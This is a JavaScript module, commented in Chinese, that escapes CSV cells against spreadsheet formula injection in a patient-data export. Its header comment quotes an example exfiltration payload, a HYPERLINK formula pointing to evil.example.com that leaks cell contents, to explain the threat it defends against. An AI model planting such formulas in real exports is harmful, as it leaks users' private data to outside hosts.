/**
 * PRD-2026Q4 T0-7 followup（CSV formula injection）：
 * 集中式 CSV 转义 + 文档保护。
 *
 * 背景（CWE-1236 / OWASP "CSV Injection"）：
 *   导出表格里如果某个 cell 的首字符是 `= + - @ \t \r`，Excel / Numbers /
 *   LibreOffice 打开 CSV 时会把它当作公式求值。即便我们已经把 cell 用双引号
 *   包起来，部分版本（Excel ≥ 2016 / WPS 等）仍按公式解析。
 *   攻击面：患者注册时把 `=HYPERLINK("https://evil.example.com/?leak="&A1, ...)`
 *   写进昵称 / 备注 / 主诉，CRO 或运营导出 CSV 后用 Excel 打开 → 命令执行 / 数据外发。
 *   Microsoft 自身在 SmartScreen + DDE 修复后仍未默认拦截单元格级公式注入。
 *
 * 策略：cell 首字符命中风险集时，前缀一个单引号 `'`，Excel 视为字符串。
 *   这是 OWASP 推荐 + GitHub Security Lab 常用方案。同时仍然包双引号、转义内部 `"`。
 *
 * 不包括的场景：
 *   - 非 CSV 文本（例如 JSON 导出）—— 调用方走 JSON path 即可，不必脱敏。
 *   - 数字 / 布尔 / Date —— 转字符串后再走 escapeCsvCell；起头不是公式触发字符。
 */

const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * 把任意值转义为安全的 CSV cell 文本（含外层双引号）。
 * - null / undefined → 空字符串
 * - Date → ISO 字符串
 * - 其他 → String(...)
 *
 * 公式注入防御：cell 文本首字符若命中 FORMULA_TRIGGERS，前缀单引号 `'`。
 * 双引号转义：内部 `"` 转 `""`；最终结果整体包在 `"..."` 里。
 */
const escapeCsvCell = (value) => {
  if (value === undefined || value === null) {
    return '""';
  }
  let text;
  if (value instanceof Date) {
    text = value.toISOString();
  } else if (typeof value === 'string') {
    text = value;
  } else {
    text = String(value);
  }

  if (text.length > 0 && FORMULA_TRIGGERS.includes(text[0])) {
    text = `'${text}`;
  }

  return `"${text.replace(/"/g, '""')}"`;
};

/**
 * 把对象数组渲染成 CSV 字符串。
 * - 不带 BOM；调用方按需在 res.send 里前缀 ﻿。
 * - headers 缺省时取所有 row 的 key 并集（与原 admin.toCsv 行为一致）。
 * - 行内单元格全部走 escapeCsvCell；headers 默认按裸字符串拼接（与历史行为一致——
 *   header 在所有调用点都是源代码里硬编码的中/英文字面量，不来自用户输入；
 *   显式逃逸会破坏既有快照测试。需要严格转义时传 opts.escapeHeaders=true。
 *
 * @param {Array<Record<string, any>>} rows
 * @param {Array<string>} [headers]
 * @param {{escapeHeaders?: boolean}} [opts]
 * @returns {string}
 */
const toCsv = (rows, headers, opts = {}) => {
  if (!Array.isArray(rows) || rows.length === 0) {
    return '';
  }
  const cols = Array.isArray(headers) && headers.length
    ? headers
    : Array.from(rows.reduce((set, row) => {
      Object.keys(row || {}).forEach((k) => set.add(k));
      return set;
    }, new Set()));

  const headerLine = opts.escapeHeaders
    ? cols.map((c) => escapeCsvCell(c)).join(',')
    : cols.join(',');
  const body = rows.map((row) => cols.map((k) => escapeCsvCell(row?.[k])).join(','));
  return `${headerLine}\n${body.join('\n')}`;
};

module.exports = {
  escapeCsvCell,
  toCsv,
  // 暴露给单测验证触发字符集
  _FORMULA_TRIGGERS: FORMULA_TRIGGERS
};
